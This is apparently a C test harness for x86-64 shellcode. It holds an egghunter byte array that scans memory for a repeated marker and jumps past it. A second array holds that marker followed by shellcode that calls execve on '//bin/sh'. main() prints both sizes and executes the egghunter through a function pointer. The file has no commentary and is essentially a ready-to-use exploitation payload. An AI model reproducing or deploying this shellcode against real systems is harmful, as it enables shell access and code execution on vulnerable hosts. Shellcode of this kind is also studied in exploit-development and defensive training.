#include<stdio.h>
#include<string.h>

unsigned char egg[] = \
"\x48\xff\xc2\x52\x59\x48\xbd\x56\x57\x56\x57\x56\x57\x56\x57\x48\xbb\x11\x11\x11\x11\x11\x11\x11\x11\x48\x29\xdd\x48\xff\xc1\x48\x3b\x29\x75\xf8\x48\x8d\x49\x08\xff\xe1"

;

unsigned char code[] = \
"\x45\x46\x45\x46\x45\x46\x45\x46"
"\x48\x31\xc0\x48\x31\xf6\x48\x31\xdb\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

;

main()
{

  printf("Shellcode size:  %d\n", strlen(code));
  printf("Egg size:  %d\n", strlen(egg));

        int (*ret)() = (int(*)())egg;

        ret();

}
